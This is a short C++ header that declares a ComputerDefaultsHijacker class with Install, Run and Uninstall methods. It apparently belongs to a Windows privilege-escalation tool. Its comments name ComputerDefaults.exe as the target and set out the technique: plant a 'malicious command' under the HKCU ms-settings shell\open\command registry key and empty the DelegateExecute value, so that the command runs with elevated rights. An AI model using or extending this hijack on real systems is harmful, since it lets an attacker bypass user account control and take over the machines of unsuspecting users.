#pragma once
#include "pch.h"

/*
 * TARGET: %WinDir%\system32\ComputerDefaults.exe
 * Method: Dll Hijacking on Registry
 */

 /*
  * TL&DR:
  *
  * HKEY_CURRENT_USER
  *		Software\Classes\ms-settings\shell\open\command
  *			DelegateExecute = ""
  *			(Default) <-- malicious command
  */

class ComputerDefaultsHijacker
{
public:
	bool Install(LPCWSTR wzCommand);
	bool Run();
	void Uninstall();
};

